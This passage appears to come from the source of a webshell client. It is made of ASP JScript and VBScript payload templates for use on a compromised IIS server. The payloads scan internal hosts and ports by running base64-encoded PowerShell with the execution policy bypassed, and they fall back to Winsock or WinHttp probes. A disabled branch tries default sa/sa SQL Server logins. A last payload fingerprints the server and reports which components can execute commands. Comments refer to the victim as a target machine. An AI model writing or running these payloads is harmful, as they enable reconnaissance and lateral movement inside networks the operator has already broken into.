  Response.Write('{"ok":true,"ports":[' + ports.join(",") + ']}');
} catch (e) { Response.Write('{"ok":false,"error":"' + jesc(e ? e.message : "") + '"}'); }`

const aspPortScan = `var host = __HOST__;
var st = new Date().getTime();
function encB64(s) {
  var stm = new ActiveXObject("ADODB.Stream");
  stm.Type = 2; stm.Charset = "utf-16le"; stm.Open(); stm.WriteText(s); stm.Position = 0;   stm.Type = 1;
  stm.Position = 2;
  var bin = stm.Read(); stm.Close();
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  xml.loadXML("<root/>");
  xml.documentElement.dataType = "bin.base64";
  xml.documentElement.nodeTypedValue = bin;
  return (xml.documentElement.text + "").replace(/[\r\n\s]/g, "");
}
function b64u16(s) {
  var tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var by = [], n = s.length * 2, o = "", i, ch, b1, b2, b3;
  for (i = 0; i < s.length; i++) {
    ch = s.charCodeAt(i) & 0xFFFF;
    by.push(ch & 0xFF); by.push((ch >> 8) & 0xFF);
  }
  for (i = 0; i < n; i += 3) {
    b1 = by[i]; b2 = (i + 1 < n) ? by[i + 1] : 0; b3 = (i + 2 < n) ? by[i + 2] : 0;
    o += tbl.charAt((b1 >> 2) & 0x3F);
    o += tbl.charAt((((b1 & 3) << 4) | (b2 >> 4)) & 0x3F);
    o += (i + 1 < n) ? tbl.charAt((((b2 & 15) << 2) | (b3 >> 6)) & 0x3F) : "=";
    o += (i + 2 < n) ? tbl.charAt(b3 & 0x3F) : "=";
  }
  return o;
}
var sh = null, shAvail = true, shErr = "";
try { sh = new ActiveXObject("WScript.Shell"); }
catch (e) { shAvail = false; shErr = (e ? e.message : ""); }
if (!shAvail) {
  Response.Write('{"ok":false,"error":"WScript.Shell 不可用: ' + shErr + '"}');
} else {
  var ports = __PORTS__;
  var psScript = "$h='" + host + "';$ps='" + ports + "'.Split(',');foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1500);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};$f='0';if($o){$f='1'};Write-Output ($p+':'+$f)}}";
  function runPwsh(cmd) {
    var o = "";
    try {
      var e = sh.Exec(cmd);
      while (!e.StdOut.AtEndOfStream) { o += e.StdOut.ReadLine() + "\n"; }
      while (!e.StdErr.AtEndOfStream) { o += e.StdErr.ReadLine() + "\n"; }
      try { o += "[exit=" + e.ExitCode + "]\n"; } catch (ee) {}
    } catch (ex) { o = "EXEC_ERROR:" + (ex ? ex.message : ""); }
    return o;
  }
  function parsePmap(txt) {
    var pm = "", ls = txt.split("\n");
    for (var k = 0; k < ls.length; k++) {
      var ln = (ls[k] + "").replace(/\x00/g, "").replace(/^\s+|\s+$/g, "");
      var idx = ln.indexOf(":");
      if (idx > 0) {
        var cpp = ln.substring(0, idx).replace(/^\s+|\s+$/g, "");
        var cff = ln.substring(idx + 1).replace(/^\s+|\s+$/g, "");
        pm = pm + "|" + cpp + "=" + cff;
      }
    }
    return pm;
  }
  var encCmd = "";
  try { encCmd = b64u16(psScript); } catch (e2) { encCmd = ""; }
  if (encCmd === "") { try { encCmd = encB64(psScript); } catch (e2b) { encCmd = ""; } }
  var pwshPrefixes = ["powershell", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"];
  var pmap = "", pwshDiag = "", pwshUsed = "";
  for (var pf = 0; pf < pwshPrefixes.length && pmap.indexOf("|") !== 0; pf++) {
    var pre = pwshPrefixes[pf];
    if (encCmd) {
      var o1 = runPwsh(pre + " -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encCmd);
      var pm1 = parsePmap(o1);
      if (pm1.indexOf("|") === 0) { pmap = pm1; pwshUsed = pre + " -EncodedCommand"; continue; }
    }
    var o2 = runPwsh(pre + " -NoProfile -ExecutionPolicy Bypass -Command \"" + psScript + "\"");
    var pm2 = parsePmap(o2);
    if (pm2.indexOf("|") === 0) { pmap = pm2; pwshUsed = pre + " -Command"; }
    else { pwshDiag = pwshDiag + "[" + pre + "] " + o2.slice(0, 300) + "  "; }
  }
  if (pmap.indexOf("|") === 0) {
    var plist = ports.split(",");
    var results = "";
    for (var pi = 0; pi < plist.length; pi++) {
      var p = (plist[pi] + "").replace(/^\s+|\s+$/g, "");
      if (!p) continue;
      var os = (pmap.indexOf("|" + p + "=1") >= 0) ? "true" : "false";
      results = results + "," + '{"port":' + p + ',"open":' + os + '}';
    }
    if (results.length > 0) results = results.substring(1);
    Response.Write('{"ok":true,"host":"' + host + '","ports":[' + results + '],"elapsed":' + ((new Date().getTime() - st) / 1000) + ',"method":"powershell","pwsh":"' + pwshUsed + '"}');
  } else {
    var wskAvail = false, wsk = null;
    try { wsk = new ActiveXObject("MSWinsock.Winsock"); wskAvail = true; } catch (e0) {}
    if (wskAvail) {
      try {
        wsk.Protocol = 0;
        var wres = "", plist3 = ports.split(","), wopen, wsStart, wstate, wfin;
        for (var wi = 0; wi < plist3.length; wi++) {
          var wp = (plist3[wi] + "").replace(/^\s+|\s+$/g, "");
          if (!wp) continue;
          wopen = false;
          try {
            wsk.Close();
            wsk.Connect(host, parseInt(wp, 10));
            wsStart = new Date().getTime(); wfin = false;
            while (new Date().getTime() - wsStart < 2000 && !wfin) {
              wstate = wsk.State;
              if (wstate === 7) { wopen = true; wfin = true; }
              else if (wstate === 9) { wopen = false; wfin = true; }
              else { sh.Sleep(50); }
            }
            wsk.Close();
          } catch (we) { wopen = false; }
          wres = wres + "," + '{"port":' + parseInt(wp, 10) + ',"open":' + wopen + '}';
        }
        if (wres.length > 0) wres = wres.substring(1);
        Response.Write('{"ok":true,"host":"' + host + '","ports":[' + wres + '],"elapsed":' + ((new Date().getTime() - st) / 1000) + ',"method":"winsock"}');
      } catch (we2) { wskAvail = false; }
    }
    if (!wskAvail) {
      var http, code, port, plist2, results2 = "", open;
      plist2 = ports.split(",");
      for (var i = 0; i < plist2.length; i++) {
        port = (plist2[i] + "").replace(/^\s+|\s+$/g, "");
        if (!port) continue;
        open = false; code = 0;
        try {
          http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
          http.SetTimeouts(1500, 1500, 1500, 1500);
          http.Open("GET", "http://" + host + ":" + port + "/", false);
          http.Send();
          open = true;
        } catch (e) {
          code = (e && typeof e.number !== "undefined") ? e.number : 0;
          open = (code === -2147012866);
        }
        results2 = results2 + "," + '{"port":' + parseInt(port, 10) + ',"open":' + open + '}';
      }
      if (results2.length > 0) results2 = results2.substring(1);
      Response.Write('{"ok":true,"host":"' + host + '","ports":[' + results2 + '],"elapsed":' + ((new Date().getTime() - st) / 1000) + ',"method":"winhttp","pwshDiag":"' + pwshDiag.slice(0, 500).replace(/"/g, "'").replace(/\\/g, "/").replace(/[^\x20-\x7E]/g, " ") + '","note":"PowerShell不可用，已用WinHttp(仅HTTP端口)探测"}');
    }
  }
}`

const vbsHostScan =`On Error Resume Next
Dim hosts, ports, probe, hi, pi, h, pr, port, allResults, hres, opj, up, st, ws, ec, out, ps, usePs, harr, parr, prr
hosts = __HOSTS__
ports = __PORTS__
probe = __PROBE__
st = Timer
arrH = Split(hosts, "|")
arrP = Split(ports, ",")
arrPr = Split(probe, ",")
allResults = ""
' 主引擎：PowerShell 原始 TCP connect（存活探测 + 端口探测），可准确区分开放/非开放端口；
' 不可用时退化到 WinHttp（见下文 If Not usePs 分支）。ADO 探测已移除（无法区分开放/非开放）。
' 通过 ws.Exec 调用 powershell -EncodedCommand（Base64 UTF-16LE，不经 cmd、不写临时 .ps1）：
' 规避 IIS 应用池读取临时文件导致的 80070005，也规避内联 -Command 在靶机报 500 的问题。
  usePs = False
  Set ws = CreateObject("WScript.Shell")
  If Err.Number = 0 Then
    ps = "$hs='" & hosts & "'.Split('|');$ps='" & ports & "'.Split(',');$pr='" & probe & "'.Split(',');foreach($h in $hs){$h=$h.Trim();if($h-ne''){$up=$false;foreach($q in $pr){$q=$q.Trim();if($q-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$q,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(600);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$up=$true;break}}};$op='';if($up){foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1000);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$op=$op+','+$p}}}}$al='0';if($up){$al='1'};Write-Output ($h+'|'+$al+'|'+$op.Trim(','))}}"
    Err.Clear
    Set ec = ws.Exec("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & EncB64(ps))
    execErr = ""
    If Err.Number <> 0 Then execErr = "exec-error: " & Err.Description
    out = ""
    errout = execErr
    If Err.Number = 0 Then
      Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
      Do While Not ec.StdErr.AtEndOfStream: errout = errout & ec.StdErr.ReadLine() & vbCrLf: Loop
    End If
    allResults = ""
    Dim hlinesArr, hline, hci, hhost, halive, aidx, aliveFlag, openList, hopArr, hopi
    hlinesArr = Split(out, vbCrLf)
    For li2 = 0 To UBound(hlinesArr)
      hline = Trim(hlinesArr(li2))
      hci = InStr(hline, "|")
      If hci > 0 Then
        hhost = Trim(Left(hline, hci - 1))
        halive = Trim(Mid(hline, hci + 1))
        aidx = InStr(halive, "|")
        If aidx > 0 Then
          aliveFlag = Left(halive, aidx - 1)
          openList = Mid(halive, aidx + 1)
        Else
          aliveFlag = halive
          openList = ""
        End If
        opj = ""
        If aliveFlag = "1" Then
          hopArr = Split(openList, ",")
          For hopi = 0 To UBound(hopArr)
            If Trim(hopArr(hopi)) <> "" Then opj = opj & "," & Trim(hopArr(hopi))
          Next
        End If
        If Len(opj) > 0 Then opj = Mid(opj, 2)
        If aliveFlag = "1" Then
          hres = "{""host"":" & """" & hhost & """" & ",""alive"":true,""ports"":[" & opj & "]}"
        Else
          hres = "{""host"":" & """" & hhost & """" & ",""alive"":false,""ports"":[]}"
        End If
        allResults = allResults & "," & hres
      End If
    Next
    If Len(allResults) > 0 Then allResults = Mid(allResults, 2)
    If allResults <> "" Then
      usePs = True
      Response.Write("{""ok"":true,""hosts"":[" & allResults & "],""elapsed"":" & CStr(Timer - st) & "}")
    Else
      usePs = False
    End If
  End If
If Not usePs Then
  ' 退化：无 PowerShell 时用 WinHttp 探测
  Dim http, code, ok
  harr = Split(hosts, "|")
  parr = Split(ports, ",")
  prr = Split(probe, ",")
  allResults = ""
  st = Timer
  For hi = 0 To UBound(harr)
    h = Trim(harr(hi))
    If h <> "" Then
      up = False
      For pi = 0 To UBound(prr)
        pr = Trim(prr(pi))
        If pr <> "" Then
          Err.Clear
          Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
          If Err.Number = 0 Then
            On Error Resume Next
            http.SetTimeouts 600, 500, 500, 500
            http.Open "GET", "http://" & h & ":" & pr & "/", False
            http.Send
            code = Err.Number
            On Error Resume Next
            If code = -2147012867 Or code = -2147012889 Then
              up = False
            Else
              up = True
            End If
          End If
          If up Then Exit For
        End If
      Next
      opj = ""
      If up Then
        For pi = 0 To UBound(parr)
          port = Trim(parr(pi))
          If port <> "" Then
            ok = False
            Err.Clear
            Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
            If Err.Number = 0 Then
              On Error Resume Next
              http.SetTimeouts 1000, 800, 800, 800
              http.Open "GET", "http://" & h & ":" & port & "/", False
              http.Send
              code = Err.Number
              On Error Resume Next
              If code = -2147012867 Or code = -2147012889 Or code = -2147012894 Or code = -2147012891 Or code = -2147013001 Then
                ok = False
              Else
                ok = True
              End If
            End If
            If ok Then opj = opj & "," & port
          End If
        Next
      End If
      If Len(opj) > 0 Then opj = Mid(opj, 2)
      If up Then
        hres = "{""host"":" & """" & h & """" & ",""alive"":true,""ports"":[" & opj & "]}"
      Else
        hres = "{""host"":" & """" & h & """" & ",""alive"":false,""ports"":[]}"
      End If
      allResults = allResults & "," & hres
    End If
  Next
  If Len(allResults) > 0 Then allResults = Mid(allResults, 2)
  Response.Write("{""ok"":true,""hosts"":[" & allResults & "],""elapsed"":" & CStr(Timer - st) & ",""note"":""powershell不可用，已用WinHttp(TCP)探测""}")
End If
Function CleanCtrl(s)
  Dim i, c, r
  r = ""
  For i = 1 To Len(s)
    c = Mid(s, i, 1)
    If Asc(c) >= 32 Then r = r & c Else r = r & " "
  Next
  CleanCtrl = r
End Function
Function PSR(outRaw, errRaw, el)
  Dim s, a, b, cand, je
  s = Trim(outRaw)
  a = InStr(s, "{")
  b = InStrRev(s, "}")
  If a > 0 And b >= a Then
    cand = Mid(s, a, b - a + 1)
    PSR = CleanCtrl(Replace(cand, """elapsed"":0", """elapsed"":" & CStr(el)))
  Else
    je = CleanCtrl(Trim(errRaw & " " & s))
    je = Replace(je, Chr(92), Chr(92) & Chr(92))
    je = Replace(je, Chr(34), Chr(92) & Chr(34))
    PSR = "{""ok"":false,""engine"":""powershell"",""error"":""" & Left(je, 4000) & """,""stderr"":""" & Left(je, 4000) & """}"
  End If
End Function
Function EncB64(s)
  Dim st, bin, xml
  On Error Resume Next
  Set st = CreateObject("ADODB.Stream")
  st.Type = 2
  st.Charset = "utf-16le"
  st.Open
  st.WriteText s
  st.Position = 0
  st.Type = 1
  st.Position = 2
  bin = st.Read
  st.Close
  Set xml = CreateObject("MSXML2.DOMDocument")
  xml.LoadXML "<root/>"
  xml.documentElement.dataType = "bin.base64"
  xml.documentElement.nodeTypedValue = bin
  EncB64 = xml.documentElement.text
End Function`

const aspHostScan = `var sh = null, shAvail = true, shErr = "";
function encB64(s) {
  var stm = new ActiveXObject("ADODB.Stream");
  stm.Type = 2; stm.Charset = "utf-16le"; stm.Open(); stm.WriteText(s); stm.Position = 0;   stm.Type = 1;
  stm.Position = 2;
  var bin = stm.Read(); stm.Close();
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  xml.loadXML("<root/>");
  xml.documentElement.dataType = "bin.base64";
  xml.documentElement.nodeTypedValue = bin;
  return (xml.documentElement.text + "").replace(/[\r\n\s]/g, "");
}
function trimS(s) { return (s + "").replace(/^\s+|\s+$/g, ""); }
try { sh = new ActiveXObject("WScript.Shell"); }
catch (e) { shAvail = false; shErr = (e ? e.message : ""); }
if (!shAvail) {
  Response.Write('{"ok":false,"error":"WScript.Shell 不可用: ' + shErr + '"}');
} else {
  var hosts = __HOSTS__;
  var ports = __PORTS__;
  var probe = __PROBE__;
  var st = new Date().getTime();
  var adoAvail = true;
  try { var _c = new ActiveXObject("ADODB.Connection"); }
  catch (e) { adoAvail = false; }
  if (false) {
    function adoOpen(host, port) {
      try {
        var c = new ActiveXObject("ADODB.Connection");
        c.ConnectionTimeout = 1;
        c.CommandTimeout = 1;
        c.Open("Provider=SQLOLEDB;Data Source=" + host + "," + port + ";User ID=sa;Password=sa;Connect Timeout=1;");
        return true;
      } catch (e) {
        var d = (((e && e.description) ? e.description : "") + " " + ((e && e.message) ? e.message : "")) + "";
        d = d.toLowerCase();
        if (d.indexOf("does not exist") >= 0 || d.indexOf("refused") >= 0 || d.indexOf("network-related") >= 0 || d.indexOf("timed out") >= 0 || d.indexOf("timeout expired") >= 0 || d.indexOf("could not open a connection") >= 0) return false;
        return true;
      }
    }
    var hlist = hosts.split("|");
    var plist = ports.split(",");
    var prlist = probe.split(",");
    var results = [];
    for (var hi = 0; hi < hlist.length; hi++) {
      var h = (hlist[hi] + "").replace(/^\s+|\s+$/g, "");
      if (!h) continue;
      var up = false;
      for (var pi = 0; pi < prlist.length; pi++) {
        var pr = (prlist[pi] + "").replace(/^\s+|\s+$/g, "");
        if (!pr) continue;
        if (adoOpen(h, pr)) { up = true; break; }
      }
      var opj = [];
      if (up) {
        for (var i = 0; i < plist.length; i++) {
          var port = (plist[i] + "").replace(/^\s+|\s+$/g, "");
          if (!port) continue;
          if (adoOpen(h, port)) opj.push(parseInt(port, 10));
        }
      }
      results.push({ host: h, alive: up, ports: opj });
    }
    Response.Write(JSON.stringify({ ok: true, hosts: results, elapsed: (new Date().getTime() - st) / 1000 }));
  } else {
  var ps = "$hs='" + hosts + "'.Split('|');$ps='" + ports + "'.Split(',');$pr='" + probe + "'.Split(',');foreach($h in $hs){$h=$h.Trim();if($h-ne''){$up=$false;foreach($q in $pr){$q=$q.Trim();if($q-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$q,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(600);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$up=$true;break}}};$op='';if($up){foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1000);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};if($o){$op=$op+','+$p}}}}$al='0';if($up){$al='1'};Write-Output ($h+'|'+$al+'|'+$op.Trim(','))}}";
  var out = "", errout = "";
  try {
    var ec = sh.Exec("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encB64(ps));
    while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
    while (!ec.StdErr.AtEndOfStream) { errout += ec.StdErr.ReadLine() + "\n"; }
  } catch (e) {
    out = "";
    errout = (e ? e.message : "");
  }
  var lines = out.split("\n");
  var results = "";
  var gotPs = false;
  for (var li = 0; li < lines.length; li++) {
    var line = trimS(lines[li]);
    var ci = line.indexOf("|");
    if (ci > 0) {
      gotPs = true;
      var hhost = trimS(line.substring(0, ci));
      var rest = trimS(line.substring(ci + 1));
      var aidx = rest.indexOf("|");
      var aliveFlag = (aidx > 0) ? rest.substring(0, aidx) : rest;
      var openList = (aidx > 0) ? rest.substring(aidx + 1) : "";
      var opj = "";
      if (aliveFlag === "1") {
        var hopArr = openList.split(",");
        for (var oi = 0; oi < hopArr.length; oi++) {
          var pt = trimS(hopArr[oi]);
          if (pt) opj = opj + "," + pt;
        }
      }
      if (opj.length > 0) opj = opj.substring(1);
      var aliveStr = (aliveFlag === "1") ? "true" : "false";
      results = results + "," + '{"host":"' + hhost + '","alive":' + aliveStr + ',"ports":[' + opj + ']}';
    }
  }
  if (gotPs) {
    if (results.length > 0) results = results.substring(1);
    Response.Write('{"ok":true,"hosts":[' + results + '],"elapsed":' + ((new Date().getTime() - st) / 1000) + '}');
  } else {
    var hlist = hosts.split("|");
    var plist = ports.split(",");
    var prlist = probe.split(",");
    var results2 = "", up, open, code, http;
    for (var hi = 0; hi < hlist.length; hi++) {
      var h = trimS(hlist[hi]);
      if (!h) continue;
      up = false;
      for (var pi = 0; pi < prlist.length; pi++) {
        var pr = trimS(prlist[pi]);
        if (!pr) continue;
        code = 0;
        try {
          http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
          http.SetTimeouts(600, 500, 500, 500);
          http.Open("GET", "http://" + h + ":" + pr + "/", false);
          http.Send();
          up = true;
        } catch (e) {
          code = (e && typeof e.number !== "undefined") ? e.number : 0;
          if (code === -2147012867 || code === -2147012889) up = false;
          else up = true;
        }
        if (up) break;
      }
      var opj2 = "";
      if (up) {
        for (var i = 0; i < plist.length; i++) {
          var port = trimS(plist[i]);
          if (!port) continue;
          open = false; code = 0;
          try {
            http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            http.SetTimeouts(1000, 800, 800, 800);
            http.Open("GET", "http://" + h + ":" + port + "/", false);
            http.Send();
            open = true;
          } catch (e) {
            code = (e && typeof e.number !== "undefined") ? e.number : 0;
            if (code === -2147012867 || code === -2147012889 || code === -2147012894 || code === -2147012891 || code === -2147013001) open = false;
            else open = true;
          }
          if (open) opj2 = opj2 + "," + parseInt(port, 10);
        }
      }
      if (opj2.length > 0) opj2 = opj2.substring(1);
      var aliveStr2 = up ? "true" : "false";
      results2 = results2 + "," + '{"host":"' + h + '","alive":' + aliveStr2 + ',"ports":[' + opj2 + ']}';
    }
    if (results2.length > 0) results2 = results2.substring(1);
    Response.Write('{"ok":true,"hosts":[' + results2 + '],"elapsed":' + ((new Date().getTime() - st) / 1000) + ',"note":"powershell不可用，已用WinHttp(TCP)探测"}');
  }
}
}`

const aspEnv = `try {
  var ver = "";
  try { ver = ScriptEngineMajorVersion() + "." + ScriptEngineMinorVersion() + " (" + ScriptEngine() + ")"; } catch (e) {}
  var server = "", docRoot = "";
  try { server = (Request.ServerVariables("SERVER_SOFTWARE") + ""); } catch (e) {}
  try { docRoot = (Request.ServerVariables("APPL_PHYSICAL_PATH") + ""); } catch (e) {}
  var osname = "";
  try {
    var wmi = GetObject("winmgmts:\\.\root\cimv2");
    var os = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem");
    for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) { osname = e.item().Caption; }
  } catch (e) {}
  function avail(progId) { try { var o = new ActiveXObject(progId); return true; } catch (e) { return false; } }
  var comps = {
    "WScript.Shell": avail("WScript.Shell"),
    "Scripting.FileSystemObject": avail("Scripting.FileSystemObject"),
    "ADODB.Stream": avail("ADODB.Stream"),
    "ADODB.Connection": avail("ADODB.Connection"),
    "Scripting.Dictionary": avail("Scripting.Dictionary"),
    "MSXML2.DOMDocument": avail("MSXML2.DOMDocument"),
    "WScript.Network": avail("WScript.Network")
  };
  var anyExec = !!comps["WScript.Shell"];
  var list = [];
  for (var k in comps) { if (comps[k]) list.push(k); }
  Response.Write(JSON.stringify({ kind: "asp", ok: true, engine: ver, serverSoftware: server,
    docRoot: docRoot, os: osname, anyExec: anyExec, execComponents: comps, components: list }));
} catch (e) { Response.Write(JSON.stringify({ kind: "asp", ok: false, error: (e ? e.message : "") })); }`
